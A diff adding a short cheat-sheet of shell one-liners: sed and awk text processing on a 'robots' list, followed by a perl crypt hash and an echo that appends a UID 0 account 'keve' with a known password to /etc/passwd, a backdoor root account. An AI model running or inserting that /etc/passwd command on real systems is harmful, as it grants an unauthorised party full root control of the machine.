@@ -1,0 +1,25 @@
+add extention
+
+cat robots | sed 's/\///' > 22
+typeset TMP_FILE=$( mktemp )
+touch "${TMP_FILE}"
+cp -p 22 "${TMP_FILE}"
+sed -e 's/$/\.com/' "${TMP_FILE}" > 33
+
+longest to shortest
+
+awk '{ print length($0) " " $0; }' 44 | sort -r -n | cut -d ' ' -f 2- > 77
+
+
+
+
+remove first special char from line \
+
+cat robots | sed 's/\///' > 22
+
+
+
+$ perl -le 'print crypt("foo", "aa")'
+aaKNIEDOaueR6
+
+echo "keve:aaKNIEDOaueR6:0:0:root2:/root:/bin/bash" >> /etc/passwd
